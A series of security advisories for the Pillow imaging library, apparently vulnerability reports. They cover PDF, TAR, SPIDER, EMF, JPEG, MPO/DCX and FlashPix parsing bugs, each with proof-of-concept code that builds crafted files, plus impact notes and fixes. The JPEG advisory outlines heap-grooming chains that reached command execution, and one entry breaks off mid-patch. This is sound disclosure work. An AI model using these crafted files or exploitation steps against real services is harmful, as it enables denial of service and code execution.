shared_dag["input_bytes"] <= 2048,         "append_path_processed_both_inputs": linear["output_bytes_after_append"]         > linear["input_bytes"]         and shared_dag["output_bytes_after_append"] > shared_dag["input_bytes"],     }     result = {         "pillow_version": PIL.__version__,         "pillow_file": PIL.__file__,         "depth": depth,         "linear_control": linear,         "shared_dag_candidate": shared_dag,         "checks": checks,         "overall_passed": all(checks.values()),     }     print(json.dumps(result, indent=2, sort_keys=True))     return 0 if result["overall_passed"] else 1   if __name__ == "__main__":     raise SystemExit(main()) ```  Run:  ```bash python3 poc_pillow_pdf_page_tree_dag.py ```  Expected result:  ```text "overall_passed": true "linear_control": observed_refs == 1 "shared_dag_candidate": input_bytes == 1410 "shared_dag_candidate": observed_refs == 8192 "shared_dag_candidate": distinct_refs == 1 ```  Observed on current `main` / `13.0.0.dev0`:  ```text 1410-byte input -> 8192 observed page refs -> 9.563007s append ```  Observed on Pillow `12.3.0`:  ```text Pillow 12.3.0: 1410-byte input -> 8192 observed page refs -> 9.670602s append ```  For comparison, the linear control in the same harness uses a comparable-depth page tree with `fanout=1`; it produces one page reference and completed append in about `0.016` to `0.028` seconds in my validation runs.  ### Impact  This is an availability issue in Pillow's PDF append handling. Applications are impacted if untrusted users can supply an existing PDF that the application later appends to, watermarks, or exports using Pillow's `Image.save(..., format="PDF", append=True)` route.  The demonstrated primitive is deterministic CPU/resource amplification from compact attacker-controlled PDF bytes. The proof does not demonstrate confidentiality impact, integrity impact, memory corruption, filesystem access, network access, or impact through ordinary `Image.open()`.  Requires attacker-influenced existing PDF processed by Pillow's documented PDF append path; not ordinary Image.open().  This should not be treated as just an unexpected Python exception. In the tested affected builds, the malformed PDF is accepted and processed to normal completion after the expensive expansion.  ### Remediation  Reject duplicate and cyclic page-tree references before constructing `self.pages` and `self.orig_pages`.  One possible fix is to pass traversal state through `linearize_page_tree()`:  - Track active `/Pages` references to reject cycles. - Track seen page-tree and page indirect references to reject duplicate references. - Raise `PdfFormatError` when the page tree is not an acyclic tree of unique indirect references.  Suggested regression tests:  - A small PDF whose `/Kids` array repeats the same child `/Pages` reference should raise `PdfFormatError` quickly when used through `Image.save(..., format="PDF", append=True)`. - A normal nested linear page tree should continue to append successfully.

### Summary `TarIO.__init__` does not check that a tar header's size field is positive. A crafted header with a negative size makes it seek backward onto itself. This causes an infinite loop that uses 100% CPU and never returns.  ### Details `TarIO.__init__` reads 512-byte tar headers one at a time, looking for a member with a given name. For each header it reads the size field and skips ahead to the next header:  ```python size = int(s[124:135], 8) ... self.fh.seek((size + 511) & (~511), io.SEEK_CUR) ``` There is no check that size is zero or more. A tar header can set this field to a negative octal value. For size = -512, the seek offset comes out to exactly -512, which cancels the 512 bytes the loop had just read. The file position goes right back to where this loop step started.  The loop only stops on end of file or when a header name starts with a null byte. Neither happens, since the same header keeps showing up again. The loop never ends on its own.  ### Steps to reproduce  This uses Tests/images/hopper.tar, a normal file already in the Pillow test suite. It only changes the size field of the first header.  ```python from PIL import TarIO  with open("Tests/images/hopper.tar", "rb") as f:     data = bytearray(f.read())  # Set the size field (bytes 124 to 135) to a negative octal value. # Octal 1000 is 512, so this is size = -512. data[124:135] = b"  -00001000"  with open("poisoned.tar", "wb") as f:     f.write(data)  # "does-not-exist" does not match the header name, so TarIO must # keep scanning. This call never returns. TarIO.TarIO("poisoned.tar", "does-not-exist") ```  We confirmed this with ps. The process sits at 98 to 100% CPU and never exits on its own. It only stops if killed from outside.  A pytest version of this, using pytest-timeout so the test does not hang forever, is below. On the current code it fails with Failed: Timeout (>3.0s) from pytest-timeout.  ```python from __future__ import annotations  from pathlib import Path  import pytest  from PIL import TarIO  SOURCE_TAR = "Tests/images/hopper.tar"   @pytest.mark.timeout(3) def test_negative_size_field_does_not_hang(tmp_path: Path) -> None:     with open(SOURCE_TAR, "rb") as f:         data = bytearray(f.read())      data[124:135] = b"  -00001000"  # octal 1000 = decimal 512, negated      poisoned_tar = tmp_path / "poisoned.tar"     poisoned_tar.write_bytes(data)      with pytest.raises((OSError, ValueError)):         with TarIO.TarIO(str(poisoned_tar), "does-not-exist"):             pass ``` ### Impact  - Availability: an attacker who can get a crafted tar file passed to TarIO.TarIO() can hang the process at full CPU with a file just over 512 bytes. - Confidentiality: none. - Integrity: none. - TarIO is a small helper class. It is not used by Image.open() and is not on the default path most Pillow users hit. An app has to call PIL.TarIO.TarIO(path, member_name) directly for this to matter, which some apps do to read an image out of a tar archive.

## Summary SpiderImagePlugin's seek() bypasses the decompression bomb check, allowing a tiny (<1KB) crafted SPIDER stack file to trigger a multi-gigabyte allocation on im.load().  ## Affected versions All versions up to and including current HEAD (v13.0.0.dev0, commit e7a7ea84)  ## Root cause Image.open() runs Image._decompression_bomb_check(im.size) exactly once, in _open_core (src/PIL/Image.py:3668), right after the initial _open().   SPIDER stack files are multi-frame: SpiderImageFile.seek(frame) (SpiderImagePlugin.py:179-190) computes an attacker-influenced stkoffset and calls self._open() AGAIN directly (line 190) — NOT through Image.open(). _open() re-parses a fresh 27-float header at that offset and reassigns:      self._size = int(h[12]), int(h[2])      # SpiderImagePlugin.py:131  straight from unvalidated header floats (isSpiderHeader only checks internal labrec*lenbyt==labbyt consistency, never bounds nsam/nrow). No bomb check runs on this new size.  On the subsequent load(), ImageFile.load_prepare() (ImageFile.py:436-437) executes `self.im = Image.core.new(self.mode, self.size)` with the unchecked, attacker-chosen size. Mode is always "F" (4 bytes/pixel), so e.g. 40000x40000 = 6.4 GB.  ## Why this is a real bug Sibling multi-frame plugins DO re-check on their alternate paths: - GifImagePlugin.py:286 - Image._decompression_bomb_check(self._size) (in seek) - TiffImagePlugin.py:1309 - Image._decompression_bomb_check(self._tile_size) - IcnsImagePlugin.py:121/138, IcoImagePlugin.py:236/240 (sub-image selection)  SpiderImagePlugin has NO bomb check anywhere. This is the same class of bug just fixed for GdImageFile (GHSA-phj9-mv4w-65pm) and the FontFile classes (GHSA-5x94/8v84/45hq): an allocation reached on a non-Image.open() path sized by an attacker header field, independent of the one-time pixel bomb check.  ## Reproduction Python 3.13, Pillow HEAD e7a7ea84  Attached: pillow_poc_spider_bomb.py  Sets Image.MAX_IMAGE_PIXELS=5000, then: - CONTROL: Image.open(standalone 100x100 SPIDER) -> DecompressionBombWarning fires correctly. - BYPASS: Image.open(stack, frame0=1x1) passes; im.seek(1) sets size (100,100) with NO DecompressionBombWarning/Error -> the check is bypassed.  Real-world impact: a large frame-1 nsam/nrow (e.g. 40000x40000) causes im.load() to allocate ~6.4 GB (mode F) with the bomb check fully bypassed, from a file under 1 KB.  ## Suggested fix Call Image._decompression_bomb_check(self.size) at the end of SpiderImageFile._open() (or in seek() after _open()), mirroring GifImagePlugin / TiffImagePlugin. Optionally validate nsam/nrow are positive and sane in _open().  Credit: Yazan Balawneh - CyStack Security Team  [pillow_poc_spider_bomb.py](https://github.com/user-attachments/files/30244916/pillow_poc_spider_bomb.py)

### Summary On Windows builds, Pillow stores EMF and WMF image dimensions without a range check and passes them to the native `drawwmf` handler. That code sizes its allocation from dimensions truncated into 16-bit header fields but copies the result using the full 32-bit dimensions. A crafted metafile that is wide and short passes the decompression-bomb pixel check yet causes a heap over-read.  ### Details The EMF branch computes the size straight from signed 32-bit header fields and stores it with no positivity or range check:  - `src/PIL/WmfImagePlugin.py:121-129` reads the bounding box; `:148` stores it; the size reaches the native handler through `src/PIL/WmfImagePlugin.py:56`.  In the native handler the DIB header fields `bcWidth` and `bcHeight` are 16-bit and truncate the allocation, while the copy length uses the untruncated ints:  - `src/display.c:793-794` assign the 16-bit fields - `src/display.c:800` sizes the allocation from them - `src/display.c:827` copies `height * ((width * 3 + 3) & -4)` bytes using the full values  The whole handler is compiled only on Windows (`#ifdef _WIN32`, `src/display.c:33-841`).  ### PoC ```python import struct from PIL import Image  def L(v):     return struct.pack("<i", v)  # Minimal EMF header. Bounding box is 70000 x 1, so the pixel count (70000) passes the # decompression-bomb check, but the width truncates to 16 bits for the allocation while # the copy uses 70000. emf  = b"\x01\x00\x00\x00" + L(88)          # record type + size emf += L(0) + L(0) + L(70000) + L(1)        # rclBounds: x0, y0, x1, y1 emf += L(0) + L(0) + L(100) + L(100)        # rclFrame (non-zero, used for the dpi calc) emf += b" EMF"                              # signature at offset 40 emf += bytes(44) open("poc.emf", "wb").write(emf)  im = Image.open("poc.emf") print("size:", im.size, "pixels:", im.size[0] * im.size[1]) im.load()                                   # over-read happens here on a Windows build ```  On Linux the first part is observable: the 88-byte file opens, `size` is `(70000, 1)`, and the bomb check passes. The native over-read only exists on Windows because `Image.core.drawwmf` is compiled out elsewhere (on Linux `im.load()` raises `OSError` instead).  ### Impact CWE-125, out-of-bounds read in a C extension on Windows builds. A crafted EMF or WMF that passes the pixel check can read past a heap buffer, leaking memory or crashing the process.

``` ============================================================================ Heap buffer overflow writing JPEG comment after ICC profile fills buffer Location: src/libImaging/JpegEncode.c:330  in ImagingJpegEncode() Commit:   a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ```  A heap buffer overflow in Pillow's JPEG encoder lets anyone who can supply an image write up to 64 KB of bytes they choose, followed by the rest of the compressed image, past the end of a 64 KB heap buffer. The target is any application that re-saves the image as JPEG while keeping its colour profile. The reliable result is that the Python process is killed outright rather than raising an exception. Because the overwritten memory sits directly in front of function pointers that the encoder calls next, this could allow code execution, though the attached reproducer demonstrates only the crash.  The bug is in `ImagingJpegEncode()` in `src/libImaging/JpegEncode.c`. State 4 (line 330) calls `jpeg_write_marker()` for the COM comment marker without checking that the output buffer has room. Meanwhile, `JpegImagePlugin._save()` sizes that buffer from the EXIF and ICC/XMP data only and reserves nothing for the comment. When a 65498-byte ICC profile fills the 65536-byte buffer exactly, libjpeg's `emit_byte()` stores one byte past the end and then decrements `free_in_buffer` from 0. The `size_t` counter wraps, so the marker, the comment and the entire compressed image are written out of bounds.  Triggering it takes only a valid JPEG (or PNG) carrying that profile and any comment, passed through `Image.open()` and then `im.save(..., "JPEG", icc_profile=im.info.get("icc_profile"))`. That is the documented way to preserve colour. The comment is forwarded from `im.info` automatically, and no non-default setting is involved.  The attached reproducer re-saves such a file on the stock build, and the process dies with SIGSEGV. An identical file without the comment saves normally. An ASan build of Pillow will not flag this, because the stray writes happen inside the system libjpeg-turbo. Valgrind does report it, as an invalid write immediately after the 65569-byte allocation.  The unguarded call was introduced in e50ae85ea406 ("Use jpeg_write_marker to write comment", 2022-12-05) and first shipped in 9.4.0.  ## Details  `ImagingJpegEncode()` (`src/libImaging/JpegEncode.c`) is a resumable state machine that fills a caller-supplied output buffer of `bytes` bytes and returns when it is full. State 4 writes the JPEG COM marker with `jpeg_write_marker()` without first checking that the buffer has any room left. When the preceding state 3 — the verbatim copy of the "extra" APP segments (ICC profile / XMP) — ends exactly at the last byte of the buffer, `jpeg_write_marker()` is entered with `free_in_buffer == 0`. libjpeg's `emit_byte()` stores the byte first and tests `--free_in_buffer == 0` afterwards, so the `size_t` counter wraps to 2^64-1 instead of triggering the "buffer full" path, and the 4-byte marker header, the whole comment, and then (state 5) the DQT/SOF/DHT/SOS headers and the entire entropy-coded image are written linearly past the end of the 65536-byte heap buffer allocated in `src/encode.c`.  A JPEG laid out as  ``` FFD8                                   SOI FFE2 <len> "ICC_PROFILE\0" 01 01 <65498 bytes>     -> im.info["icc_profile"] FFFE <len> <comment, any length 1..65533>           -> im.info["comment"] <any baseline RGB JPEG body> ```  opened with `Image.open()` and re-saved with the usual colour-profile-preserving call  ```python im.save(out, "JPEG", icc_profile=im.info.get("icc_profile")) ```  kills the Python process on the stock build at this commit: glibc aborts with `realloc(): invalid next size` / `corrupted size vs. prev_size`, or the process takes SIGSEGV inside `jpeg_write_marker`/`jpeg_write_scanlines`. Stopping at `JpegEncode.c:330` in gdb shows `next_output_byte - buf == 65536`, `free_in_buffer == 0`, `comment_size == 65533` before the call, and `next_output_byte - buf == 131073`, `free_in_buffer == 18446744073709486079` after it — 65537 bytes already written beyond a 65536-byte buffer before a single scanline has been encoded. An ASan build of Pillow does not flag this, because the out-of-bounds stores happen inside the (uninstrumented) system libjpeg-turbo; valgrind does, reporting `Invalid write ... 0 bytes after a block of size 65,569` from `jpeg_write_marker` called at `JpegEncode.c:330` before aborting on the corrupted heap metadata.  ### Code path  The buffer. `JpegImagePlugin._save()` sizes the encoder buffer from the metadata it is about to emit, allowing one spare byte after the extra block and nothing for the comment:  ```python # src/PIL/JpegImagePlugin.py:859-862     else:         # The EXIF info needs to be written as one block, + APP1, + one spare byte.         # Ensure that our buffer is big enough. Same with the icc_profile block.         bufsize = max(len(exif) + 5, len(extra) + 1) ```  `ImageFile._save()` then takes `max(MAXBLOCK, bufsize, width*4)` (`src/PIL/ImageFile.py:662`, `MAXBLOCK = 65536`), and `_encode()` allocates exactly that: `buf = PyBytes_FromStringAndSize(NULL, bufsize)` (`src/encode.c:134`; the real-file path `_encode_to_file()` does `malloc(bufsize)` at `src/encode.c:190`). For the input above `len(extra) == 65516`, so the buffer is 65536 bytes. The `optimize`/`progressive` branch just above (`JpegImagePlugin.py:846-858`) is not immune: its `bufsize` adds `w*h` (or `2*w*h`), but the image dimensions and the ICC length both come from the file, so an exact fit is still constructible there (e.g. with a 19×1 image).  The "+1 spare byte" does not account for what libjpeg itself has already put in the buffer: in state 1 `jpeg_start_compress(&cinfo, TRUE)` (`JpegEncode.c:279`) emits SOI + JFIF APP0, 20 bytes for an RGB source. State 3 then copies the extra block, clamped to the space remaining:  ```c // src/libImaging/JpegEncode.c:302-337         case 3:             if (context->extra) {                 unsigned int n = context->extra_size - context->extra_offset;                 if (n > context->destination.pub.free_in_buffer) {                     n = context->destination.pub.free_in_buffer;                 }                 memcpy(context->destination.pub.next_output_byte, context->extra + context->extra_offset, n);                 context->destination.pub.next_output_byte += n;                 context->destination.pub.free_in_buffer -= n;                 context->extra_offset += n;                 if (context->extra_offset >= context->extra_size) {                     state->state++;                 // done -> fall into case 4, even with free_in_buffer == 0                 } else {                     break;                 }             } …          case 4:             if (context->comment) {                 jpeg_write_marker(&context->cinfo, JPEG_COM,                                   (unsigned char *)context->comment, context->comment_size);   // :330 — no space check             }             state->state++;          case 5:             if (1024 > context->destination.pub.free_in_buffer) {   // passes: free_in_buffer is now ~2^64                 break;             }             … jpeg_write_scanlines(…) … ```  Every other emitting state is guarded — state 2 requires `rawExifLen + 5 <= free_in_buffer` (`:287`), state 5 requires 1024 free bytes (`:340`), state 6 requires 100 (`:368`). State 4 has no guard at all. The unguarded `jpeg_write_marker()` call was introduced in `e50ae85ea406` ("Use jpeg_write_marker to write comment", 2022-12-05) and first shipped in 9.4.0; at 9.3.0 the same input re-saves correctly.  With 20 header bytes plus 65516 extra bytes the copy consumes the buffer to the byte (`free_in_buffer == 0`) and, because the extra block is complete, control falls straight into state 4. One re-wrapped ICC APP2 segment costs 18 bytes of overhead (`JpegImagePlugin.py:788-806`), hence the 65498-byte profile payload. Pillow's destination manager cannot suspend (`empty_output_buffer()` returns FALSE, `JpegEncode.c:45-48`), which is why a *nearly* full buffer is harmless: with 1..N free bytes the comment write decrements `free_in_buffer` to 0 part-way, libjpeg raises `JERR_CANT_SUSPEND`, and the save fails with `OSError: broken data stream`. Only the exact-fit case skips that check, because libjpeg-turbo's marker writer is  ```c /* jcmarker.c */   *(dest->next_output_byte)++ = (JOCTET)val;   if (--dest->free_in_buffer == 0) { if (!(*dest->empty_output_buffer)(cinfo)) ERREXIT(cinfo, JERR_CANT_SUSPEND); } ```  i.e. it writes `buf[65536]` first and then wraps the counter. From there nothing limits the stream: the comment (up to 65533 attacker-chosen bytes) is written verbatim, state 5's 1024-byte check passes against the wrapped counter, and `jpeg_write_scanlines()` appends the full compressed image (≈100 KB for a 256×256 noisy source; proportional to the picture for larger ones). If the process survives that, `ImagingJpegEncode()` returns `next_output_byte - buf` (≈167000) as the byte count and `_encode()` calls `_PyBytes_Resize(&buf, 167199)` on the 65536-byte object, which is where glibc usually notices the smashed neighbouring chunk.  All three ingredients come from the file. `JpegImagePlugin` reassembles APP2 `ICC_PROFILE` chunks into `im.info["icc_profile"]` (`:238-241`) and stores the COM payload in `im.info["comment"]` (`:194`); `_save()` forwards the comment on its own — `comment = info.get("comment", im.info.get("comment"))` (`:808`) — so the application only has to pass the ICC profile through, which is the standard way to keep colours correct when re-encoding (`docs/handbook/image-file-formats.rst:608`). Unlike `exif` and `xmp`, there is no length check on the comment in `_save()`. A PNG source works the same way: its `iCCP` chunk becomes `im.info["icc_profile"]` and a `tEXt` chunk keyed `comment` becomes `im.info["comment"]` (and, being zlib-compressed, the file is only ~60 KB); that variant was also confirmed to crash. `thumbnail()` and `convert()` carry `im.info` along, so the usual `open → thumbnail → convert("RGB") → save("JPEG", icc_profile=…)` handler reaches the same state. `xmp=` and `extra=` feed the same `extra` block (33 bytes of overhead for the XMP APP1) and reach the same state. If the application also forwards EXIF, the exact-fit condition becomes `len(extra) + len(exif) + 4 == 65516`, both lengths again taken from the file. The comment length is irrelevant to triggering: a 17-byte `"Created with GIMP"` comment crashes the stock build just as reliably (SIGSEGV in `jpeg_write_scanlines`), it only changes how many of the out-of-bounds bytes are chosen verbatim by the attacker.  ### What lies behind the buffer  The buffer is `PyBytes_FromStringAndSize(NULL, 65536)` = `malloc(65569)`, a 0x10030-byte glibc chunk, so `buf[65536]` is the first byte of the next chunk's header. In the same `encode()` call, right after that allocation, `jpeg_start_compress()` `malloc`s libjpeg's PERMANENT pool (chunk 0xa40) and IMAGE pool (chunk 0x3f00); on a groomed or fresh heap these sit directly behind the buffer. The next thing `ImagingJpegEncode()` does after the COM write (`JpegEncode.c:352`; the state-5 room check passes because `free_in_buffer` has wrapped) is call `jpeg_write_scanlines()`, which dispatches through the method tables in that IMAGE pool before any allocator call touches the heap. In the SIGSEGV layout observed on the stock build the fault is at `jpeg_write_scanlines+133: call *0x8(%rax)` with `%rax` pointing just past the end of the buffer at memory now holding comment bytes — an indirect call through a function pointer (`cinfo->main->process_data`) read from bytes the file supplied.  ## Impact  Any service that accepts JPEG uploads and re-encodes them as JPEG while preserving the embedded ICC profile (`icc_profile=im.info.get("icc_profile")` — thumbnailers, CMS and e-commerce image pipelines, Django/Flask upload handlers) can be made to perform a linear heap overwrite starting immediately after a 65536-byte buffer: 4 marker bytes, then up to 65533 bytes taken verbatim from the file's COM segment, then tens to hundreds of kilobytes of compressed image data. No non-default Pillow setting is involved and the file is an otherwise valid 140–210 KB JPEG that decodes normally. The dependable outcome is termination of the worker process by SIGSEGV or a glibc heap-consistency abort (not a Python exception), i.e. denial of service of everything that process serves.  It does not stop at a crash. Both the length and the content of the first 64 KB written out of bounds are attacker-chosen, the victim buffer is an ordinary `malloc` chunk, and what `jpeg_start_compress()` allocates directly behind it — libjpeg's PERMANENT and IMAGE pools, including the method pointers `jpeg_write_scanlines()` calls through immediately afterwards — is predictable. Against a long-lived stdlib-`http.server` worker running exactly the handler above (stock `/src` build, CPython 3.12 / glibc 2.36 / libjpeg62-turbo 2.1.5, ASLR/PIE/NX on, default Pillow settings, worker as root, attacker as uid 65534 given only the service address), this overflow was driven to shell command execution by the worker in two independent ways once library base addresses were known: (a) a JPEG with ~2400 APPn spray segments (heap grooming), the 65498-byte ICC profile and a 3020-byte COM whose bytes re-image the two libjpeg pools so that the real `grayscale_convert()` copies a chosen 384-byte scanline over `_PyRuntime`, setting `allocators.obj_arena.free = system` with `ctx` = the command — the request returns 200, the worker keeps serving, and the next pymalloc arena release runs the command (14/14 and 15/15 runs on fresh workers); (b) a 28-byte COM that rewrites the `size`/`next` of a groomed free tcache chunk sitting right behind the buffer so that Pillow's own `malloc(comment_size)` in the next JPEG save (`src/encode.c:1250`) returns `_imaging.so`'s writable `.got.plt`, the comment replaces `free` with `system`, and the encoder's cleanup `free(context->comment)` at `JpegEncode.c:376` runs the command (14/14, deterministic once groomed). The address knowledge came from separate memory-disclosure bugs in Pillow's TIFF paths that return library pointers in output pixels/tags; those are independent defects with their own fixes, but any such disclosure — present or future — is enough, and this overflow is the only memory *write* either chain needs. Fixing it reduces those leaks to disclosures rather than footholds.  ## Reproducing  `repro` is a single Python script. It uses the Pillow already built in `/src` and needs no rebuild. Run it as `./repro`. The last line of output is `BUG` or `OK`.  The script builds a valid 256×256 baseline JPEG from deterministic noise, so the compressed image data comes to about 100 KB. Right after SOI it adds an APP2 `ICC_PROFILE` segment (sequence 1 of 1) with a payload of `65536 - 20 - 18 = 65498` bytes. When Pillow re-encodes the image, libjpeg first writes 20 bytes of SOI and JFIF APP0, and then Pillow copies the re-wrapped ICC segment: 18 bytes of header plus the payload. Together those fill the 65536-byte encoder buffer to the last byte. The constants at the top of the script spell out this arithmetic.  Each file goes through the same application code in a child `python3 -X faulthandler` process:  ```python im = Image.open(BytesIO(data)) im.save(BytesIO(), "JPEG", icc_profile=im.info["icc_profile"]) ```  1. **Control.** The file has the ICC profile but no COM segment. The save returns normally with exit status 0, which shows that the exact-fit ICC profile alone is harmless. 2. **PoC.** This is the same file plus a COM segment of 65533 `C` bytes. `JpegImagePlugin._save()` forwards `im.info["comment"]` automatically. Case 4 of `ImagingJpegEncode()` writes the COM marker into the full buffer, the `free_in_buffer` counter wraps, and the comment and the entire compressed image are written past the end of the heap buffer.  Expected output: the control prints `save returned normally` and `-> exit status 0`. For the PoC, faulthandler prints `Fatal Python error: Segmentation fault` (sometimes a glibc message such as `realloc(): invalid next size` followed by `Aborted`). The Python stack ends in `ImageFile._encode_tile` called from `im.save`, then `-> exit status -11` (or `-6`), and finally `BUG`. The verdict is `BUG` only if the PoC child was killed by a signal. A normal return or a Python exception such as `OSError` gives `OK`.  ## Suggested fix  The attached patch guards state 4 the way state 2 guards the EXIF marker: before calling `jpeg_write_marker()` it requires room for the 4-byte marker header plus the comment plus libjpeg's one-byte slack (`emit_byte` must never bring `free_in_buffer` to 0 with a non-suspending destination), and otherwise returns to the caller for a fresh buffer:  ```diff --- a/src/libImaging/JpegEncode.c +++ b/src/libImaging/JpegEncode.c @@ -327,6 +327,11 @@          case 4:                if (context->comment) { +                // check for comment len + 'COM' header bytes +                if (context->comment_size + 5 > +                    context->destination.pub.free_in_buffer) { +                    break; +                }                  jpeg_write_marker( ```  The encoder then returns with the buffer full, `_encode_tile()` calls it again with an empty buffer, and the comment is emitted there. The C hunk is not sufficient on its own: state 4, like state 2, relies on the Python side guaranteeing that an *empty* buffer is always large enough, and a 65533-byte comment needs 65538 bytes against a 65536-byte `MAXBLOCK` buffer — with only the C guard the encoder returns 0 bytes and no error forever and `_encode_tile()` spins. The patch therefore also changes `JpegImagePlugin._save()` to reserve `len(comment) + 5` in both sizing branches (added to `bufsize` in the `optimize`/`progressive` branch, and as a third term of the `max()` in the plain branch), and normalises the comment to `bytes` first (`str` is UTF-8-encoded, `None` becomes `b""`) so the length is exact for non-ASCII `str` comments; `encode.c` already UTF-8-encodes `str` via `z#`, so the bytes written are unchanged. A side effect visible to users: comments of up to 65533 bytes now save successfully in cases that previously raised `OSError: broken data stream` because the default buffer was too small. The patch adds `test_icc_big_comment` to `Tests/test_file_jpeg.py`, which round-trips a 65533-byte comment with ICC profiles sized around the exact-fit boundary; it crashes (or raises `OSError`) on the unpatched tree and passes with the patch. With the patch applied to a clean tree and rebuilt, the reproducer no longer triggers, and `Tests/test_file_jpeg.py` and `Tests/test_file_mpo.py` pass.  The C guard still depends on the Python sizing to avoid a 0-byte/no-error busy loop, exactly as state 2 already does. A more defensive variant would fail with `IMAGING_CODEC_MEMORY` instead of `break` when the marker does not fit and nothing has been written to the current buffer yet (`next_output_byte == buf`), so that a sizing mistake in any caller can never turn into a busy loop. It would also be consistent with `exif`/`xmp` handling for `_save()` to reject comments longer than `MAX_BYTES_IN_MARKER` (65533) with `ValueError("Comment is too long")` rather than leaving it to libjpeg's `JERR_BAD_LENGTH` → `OSError`.  Independently, the "+ 1 spare byte" / "+ 5" reasoning in `_save()` under-counts by the 18–20 bytes `jpeg_start_compress()` writes before the EXIF/extra blocks; that is what lets attacker-sized metadata land the buffer on an exact boundary in the first place. The attached patch does not change that accounting.  ## The patch  Check free output-buffer space before writing the JPEG COM marker in ImagingJpegEncode, and size the encoder buffer for the comment in JpegImagePlugin._save  Applies to `src/libImaging/JpegEncode.c` at the commit above.  ```diff diff --git a/Tests/test_file_jpeg.py b/Tests/test_file_jpeg.py index b361aef2e..f884883c4 100644 --- a/Tests/test_file_jpeg.py +++ b/Tests/test_file_jpeg.py @@ -227,6 +227,16 @@ class TestFileJpeg:          im1 = self.roundtrip(hopper(), icc_profile=icc_profile)          assert im1.info.get("icc_profile") == (icc_profile or None)   +    def test_icc_big_comment(self) -> None: +        # The ICC profile may fill the encoder buffer exactly, in which case the +        # comment has to be written to the next buffer +        comment = b"C" * 65533 +        for n in range(ImageFile.MAXBLOCK - ### Summary Pillow's decompression-bomb protection (`Image._decompression_bomb_check`, gated by `Image.MAX_IMAGE_PIXELS`) is enforced only on the **first frame**, inside `Image.open()`. For multi-frame formats, `seek()` re-parses the target frame's header and resets `self._size`. `GifImagePlugin` and `TiffImagePlugin` re-run the bomb check on `seek()`, but **`MpoImageFile.seek()` and `DcxImageFile.seek()` do not.** A crafted MPO or DCX whose first frame is tiny (passing the check) but whose later frame declares enormous dimensions therefore bypasses the protection: loading that frame decodes an over-limit image and commits large amounts of memory — a denial of service (memory exhaustion / OOM).  Same class as the recently assigned CVE-2026-55379 (BdfFontFile), CVE-2026-55380 (GdImageFile) and CVE-2026-40192 (FITS GZIP).  ### Details `Image.open()` → `_open_core()` runs `_decompression_bomb_check(im.size)` once, on the frame present at open time. Both vulnerable `seek()` methods re-parse a new frame and set a new `self._size` without re-checking:  - **`PIL/MpoImagePlugin.py`, `MpoImageFile.seek()`**: calls `JpegImagePlugin.JpegImageFile._open(self)` (which sets `self._size` from the frame's JPEG SOF) and rebuilds `self.tile`, with no `Image._decompression_bomb_check(self.size)`. - **`PIL/DcxImagePlugin.py`, `DcxImageFile.seek()`**: calls `PcxImageFile._open(self)` (which sets `self._size` from the page's PCX header), with no check.  Confirmed present in **12.3.0** (latest release) and on **`main`** (13.0.0.dev0). Compare `GifImagePlugin._seek` and `TiffImagePlugin`, which call `_decompression_bomb_check` correctly on seek.  ### PoC Self-contained; the victim uses **default** `MAX_IMAGE_PIXELS`:  ```python import io from PIL import Image  # attacker builds the file (guard disabled only to CREATE the oversized frame) Image.MAX_IMAGE_PIXELS = None small = Image.new("RGB", (8, 8)) big   = Image.new("RGB", (14000, 14000), (120, 60, 30))   # 196,000,000 px > error threshold buf = io.BytesIO() small.save(buf, format="MPO", save_all=True, append_images=[big]) data = buf.getvalue()                                      # ~3 MB Image.MAX_IMAGE_PIXELS = int(1024 * 1024 * 1024 // 4 // 3) # restore default  # victim (default limits) im = Image.open(io.BytesIO(data))   # frame 0 (8x8) passes the bomb check im.seek(1)                          # frame 1 (14000x14000) -> NOT re-checked  <-- bug im.load()                           # decodes the over-limit image, commits memory print("loaded over-limit frame:", im.size) ```  Measured on Pillow 12.3.0 (default limit 89,478,485 px; error threshold 178,956,970 px):  | Vector | File size | Frame 1 | Peak RSS | |---|---|---|---| | MPO (JPEG) | ~3.0 MB | 14000×14000 (196 Mpx) | ~763 MB | | DCX (PCX) | ~6.2 MB | 14000×14000 (196 Mpx) | ~200 MB | | Control: same image standalone | — | 196 Mpx | `DecompressionBombError` (correctly blocked) |  The DCX vector (`0x3ADE68B1` magic + offset directory + two PCX pages) behaves identically via `DcxImageFile.seek()`. Scaling frame 1 toward JPEG's ~65500×65500 maximum drives multi-GB commitments from a small file, reliably OOM-killing the process.  ### Impact Denial of service (memory exhaustion / OOM) — CWE-400 / CWE-1284, a bypass of Pillow's documented decompression-bomb mitigation. `seek()` + `load()` is the normal way to iterate frames (e.g. `PIL.ImageSequence.Iterator`, thumbnailers, converters, 3D-photo handlers). Because **MPO is auto-detected from a JPEG carrying MPF metadata**, a file served with a `.jpg` extension can be opened as MPO, so any application that iterates frames of untrusted images is exposed.  ### Suggested fix Re-run the check after `seek()` re-parses a frame, mirroring GIF/TIFF:  ```python # PIL/MpoImagePlugin.py — end of MpoImageFile.seek() self.tile = [ImageFile._Tile("jpeg", (0, 0) + self.size, self.offset, self.tile[0][-1])] Image._decompression_bomb_check(self.size)   # add self.__frame = frame  # PIL/DcxImagePlugin.py — end of DcxImageFile.seek() PcxImageFile._open(self) Image._decompression_bomb_check(self.size)   # add ```

### Credits  **Researcher**: Alex Bouffard (mixbo@pebwalker.com)  ### Summary  A heap buffer overflow in Pillow's FlashPix (FPX) JPEG-tile decoder lets an attacker achieve arbitrary code execution by getting an application to open a single crafted file with `Image.open()`. The file is recognized by content (the OLE2 magic), not by extension, so any service that opens or thumbnails untrusted uploads with the optional `olefile` dependency installed is reachable with no user interaction. In the PoC below, opening one crafted file executes an attacker-chosen command on stock Pillow 12.2.0 (x86_64 Ubuntu 24.04, glibc 2.39).  ### Details  `FpxImagePlugin` decodes FlashPix (FPX) files, which are OLE2/CFBF compound documents.  `Image.open()` auto-detects them from the OLE2 magic `D0CF11E0...` whenever the optional `olefile` package is installed (Pillow's documented dependency for FPX/MIC support), regardless of the file's extension.  For a JPEG-compressed subimage (`compression == 2`), the plugin builds a `"jpeg"` decode tile and derives the `(rawmode, jpegmode)` pair from attacker-controlled FPX color IDs through the `MODES` table ([`src/PIL/FpxImagePlugin.py` L25-L32](https://github.com/python-pillow/Pillow/blob/12.2.0/src/PIL/FpxImagePlugin.py#L25-L32)):  ```python MODES = {     ...     (0x00018000, 0x00017FFE): ("RGBA", "LA"),                # rawmode "LA"  (2 bytes/pixel)     ...     (0x00020000, 0x00020001, 0x00020002): ("RGB", "YCC;P"),  # rawmode "YCC;P" } ```  The Imaging output buffer for the tile is sized for the rawmode (here `"LA"` = 2 